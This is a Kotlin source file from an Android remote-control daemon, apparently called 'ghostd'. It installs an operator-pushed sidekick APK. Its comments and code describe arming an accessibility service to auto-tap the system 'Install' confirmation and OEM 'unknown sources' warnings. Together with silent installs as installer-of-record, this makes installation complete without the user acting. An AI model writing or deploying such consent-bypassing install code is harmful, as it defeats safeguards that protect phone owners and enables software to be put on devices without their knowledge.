package com.tg.ghostd

import android.content.Context
import org.json.JSONObject
import java.io.File

/**
 * `sidekick install` — installs the ghosta (com.tg.ghosta) sidekick APK
 * that was previously pushed to the phone via `files put`.
 *
 * INSTALL FLOW (important):
 *   1. Operator pushes the APK:      files put /sdcard/Download/ghosta.apk
 *      (server streams it; FileReceiver writes + sha256-verifies it).
 *   2. Operator runs:                sidekick install [path]
 *   3. ghostd installs via PackageInstaller (REQUEST_INSTALL_PACKAGES is in
 *      the manifest). ghostd is NOT the installer-of-record for com.tg.ghosta
 *      on first install, so Android shows the system confirm dialog and the
 *      USER MUST TAP "Install" — the armed sidekick AUTO-TAPS it
 *      ("Install" is in GhostAccessibilityService.CONFIRM_TEXTS), so in
 *      practice it completes hands-free. On UPDATE of a sidekick ghostd
 *      installed before — then ghostd IS the installer-of-record and
 *      PackageInstaller goes SILENT (setRequireUserAction(
 *      USER_ACTION_NOT_REQUIRED) on API 31+). Silent is preferred whenever
 *      the OS grants it; the confirm+auto-tap path is the reliable fallback.
 *   4. The command blocks until the FINAL install status and returns it
 *      (see AppUpdater.installApk); result JSON tells the operator which
 *      flow ran ("silent" flag).
 *
 * The sidekick's armed state also auto-confirms any "app installed from
 * unknown sources" warnings that some OEMs add on top.
 */
object SidekickInstaller {

    /** Default files-put destination for the sidekick APK (shared storage). */
    const val DEFAULT_APK_PATH = "/sdcard/Download/ghosta.apk"

    fun install(ctx: Context, apkPath: String = DEFAULT_APK_PATH): JSONObject {
        val f = File(apkPath)
        if (!f.exists() || !f.isFile || f.length() == 0L) {
            throw Exception(
                "apk not found at $apkPath — push it first: files put $apkPath"
            )
        }
        // Maximize the hands-free path: make sure the sidekick is armed so it
        // auto-taps the system "Install" confirm dialog (fire-and-forget; if
        // the sidekick isn't installed yet this is a no-op and the user taps).
        try {
            SidekickLink.send(JSONObject().put("cmd", "arm"))
        } catch (_: Exception) {
        }
        // Silent when we are the installer-of-record (updates of a ghosta we
        // installed before); otherwise the confirm+auto-tap fallback.
        return AppUpdater.installApk(
            ctx, apkPath,
            requireNoUserAction = AppUpdater.isInstallerOfRecord(
                ctx, AppUpdater.SIDEKICK_PACKAGE
            ),
            sessionName = "ghosta"
        )
    }
}
